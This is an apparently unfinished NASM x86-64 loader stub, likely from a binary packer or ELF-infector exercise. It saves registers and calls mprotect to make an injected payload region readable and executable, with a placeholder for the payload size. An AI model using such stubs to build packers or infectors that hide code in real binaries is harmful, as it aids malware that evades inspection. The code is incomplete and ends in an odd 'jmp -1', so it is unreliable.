default rel
global loader
;global ft_end

loader:
	push DWORD 1 ; entree
	jmp common_loader ; entree
	push DWORD 2 ; entree
	jmp common_loader ; entree
	push DWORD 3 ; entree
	jmp common_loader ; entree
	push DWORD 4 ; entree
	jmp common_loader ; entree
	push DWORD 5 ; entree
	jmp common_loader ; entree
common_loader:
    push rbp ; push
    mov rbp, rsp ; push
	and rsp, 0xFFFFFFFFFFFFFFF0 ; push
    push rdi ; push
    push rsi ; push
    push rax ; push
	push rbx ; push
    push rcx ; push
    push rdx ; push
    push r8 ; push
    push r9 ; push
    push r10 ; push
    push r11 ; push
    push r12 ; push
    push r13 ; push
    push r14 ; push
    push r15 ; push

    mov rdx, 0x7 ;EXEC | READ ; syscalls
    mov rsi, 0x29e7;|REPLACE1| size payload + 1 page ; syscalls
	lea rdi, [$ + 0x10000000] ; adresse du payload ; syscalls
	mov rbx, rdi ; syscalls
	and rdi, 0xFFFFFFFFFFFFF000 ; syscalls
	mov rax, 0xa ; syscalls
	syscall ; syscalls

	jmp -1
